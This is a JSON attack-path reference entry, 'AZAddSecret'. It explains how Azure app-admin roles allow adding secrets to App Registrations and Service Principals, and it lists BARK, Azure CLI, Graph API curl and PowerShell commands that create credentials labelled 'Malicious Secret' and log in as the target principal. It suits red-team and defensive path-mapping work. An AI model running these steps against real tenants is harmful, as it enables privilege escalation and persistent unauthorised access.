{
    "AZAddSecret": {
        "meaning": "When a principal has been granted 'Cloud App Admin' or 'App Admin' against the tenant, that principal gains the ability to add new secrets to all Service Principals and App Registrations. This allows an attacker to create authentication credentials for target applications, enabling them to authenticate as those service principals and inherit their permissions.",
        "common": "",
        "windows": {
            "BARK_AppRegistration": [
                {
                    "order": 1,
                    "command": "$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"",
                    "description": "Acquire MS Graph-scoped JWT using BARK with refresh token"
                },
                {
                    "order": 2,
                    "command": "New-AppRegSecret -AppRegObjectID \"d878...\" -Token $MGToken.access_token",
                    "description": "Add new secret to target App Registration using BARK"
                },
                {
                    "order": 3,
                    "command": "$SPToken = Get-MSGraphToken -ClientID \"4d31...\" -ClientSecret \"odg8Q~...\" -TenantName \"contoso.onmicrosoft.com\"",
                    "description": "Acquire access token using newly created secret for service principal"
                }
            ],
            "BARK_ServicePrincipal": [
                {
                    "order": 1,
                    "command": "$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"",
                    "description": "Acquire MS Graph-scoped JWT using BARK with refresh token"
                },
                {
                    "order": 2,
                    "command": "New-ServicePrincipalSecret -ServicePrincipalObjectID \"082cf9b3...\" -Token $MGToken.access_token",
                    "description": "Add new secret to target Service Principal using BARK"
                },
                {
                    "order": 3,
                    "command": "$SPToken = Get-MSGraphToken -ClientID \"CLIENT_ID\" -ClientSecret \"NEW_SECRET\" -TenantName \"contoso.onmicrosoft.com\"",
                    "description": "Authenticate using newly created Service Principal secret"
                }
            ],
            "Azure_Portal": [
                {
                    "order": 1,
                    "command": "# Navigate to Azure Portal -> App Registrations",
                    "description": "Access App Registrations in Azure portal with privileged account"
                },
                {
                    "order": 2,
                    "command": "# Find target app and go to 'Certificates & secrets' tab",
                    "description": "Navigate to secrets management interface for target application"
                },
                {
                    "order": 3,
                    "command": "# Click 'New client secret' and configure secret parameters",
                    "description": "Create new client secret for the application"
                },
                {
                    "order": 4,
                    "command": "# Copy secret value before leaving the page",
                    "description": "Retrieve and save the newly created secret value"
                }
            ]
        },
        "linux": {
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login --username user@domain.com --password password",
                    "description": "Authenticate to Azure using privileged account"
                },
                {
                    "order": 2,
                    "command": "az ad app credential reset --id APP_ID --credential-description \"Malicious Secret\"",
                    "description": "Add new secret to App Registration using Azure CLI"
                },
                {
                    "order": 3,
                    "command": "az ad sp credential reset --id SERVICE_PRINCIPAL_ID --credential-description \"Malicious Secret\"",
                    "description": "Add new secret to Service Principal using Azure CLI"
                },
                {
                    "order": 4,
                    "command": "az login --service-principal --username APP_ID --password SECRET_VALUE --tenant TENANT_ID",
                    "description": "Authenticate using newly created service principal credentials"
                }
            ],
            "Microsoft_Graph_API": [
                {
                    "order": 1,
                    "command": "curl -X POST 'https://graph.microsoft.com/v1.0/applications/{app-id}/addPassword' -H 'Authorization: Bearer $ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{\"passwordCredential\": {\"displayName\": \"MaliciousSecret\"}}'",
                    "description": "Add password credential to App Registration using Graph API"
                },
                {
                    "order": 2,
                    "command": "curl -X POST 'https://graph.microsoft.com/v1.0/servicePrincipals/{sp-id}/addPassword' -H 'Authorization: Bearer $ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{\"passwordCredential\": {\"displayName\": \"MaliciousSecret\"}}'",
                    "description": "Add password credential to Service Principal using Graph API"
                },
                {
                    "order": 3,
                    "command": "curl -X POST 'https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/token' -d 'grant_type=client_credentials&client_id=APP_ID&client_secret=SECRET_VALUE&scope=https://graph.microsoft.com/.default'",
                    "description": "Acquire access token using newly created service principal secret"
                }
            ],
            "PowerShell_Core": [
                {
                    "order": 1,
                    "command": "pwsh -c \"Connect-AzureAD -AccountId user@domain.com\"",
                    "description": "Connect to Azure AD using PowerShell Core on Linux"
                },
                {
                    "order": 2,
                    "command": "pwsh -c \"New-AzureADApplicationPasswordCredential -ObjectId APP_OBJECT_ID -CustomKeyIdentifier 'MaliciousKey'\"",
                    "description": "Add password credential to App Registration using PowerShell"
                },
                {
                    "order": 3,
                    "command": "pwsh -c \"New-AzureADServicePrincipalPasswordCredential -ObjectId SP_OBJECT_ID -CustomKeyIdentifier 'MaliciousKey'\"",
                    "description": "Add password credential to Service Principal using PowerShell"
                }
            ]
        }
    }
}
